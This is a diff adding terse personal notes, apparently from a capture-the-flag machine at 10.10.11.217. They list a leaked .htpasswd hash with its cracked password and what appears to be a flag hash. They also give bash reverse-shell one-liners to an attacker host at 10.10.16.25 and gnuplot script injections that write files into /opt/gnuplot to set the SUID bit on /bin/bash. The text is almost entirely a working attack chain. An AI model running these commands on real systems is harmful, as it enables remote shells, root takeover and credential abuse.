@@ -1,0 +1,9 @@
+10.10.11.217
+
+dev/.htpasswd
+vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20 
+c9885c463c82b7f0ef504abbc21581b0
+system "bash -c 'bash -i >& /dev/tcp/10.10.16.25/4444 0>&1'"
+echo "system "bash -c '/bin/bash -l > /dev/tcp/10.10.16.25/4242 0<&1 2>&1'"" > /opt/gnuplot/shell.sh
+echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/shell.sh
+echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/shell.ptl
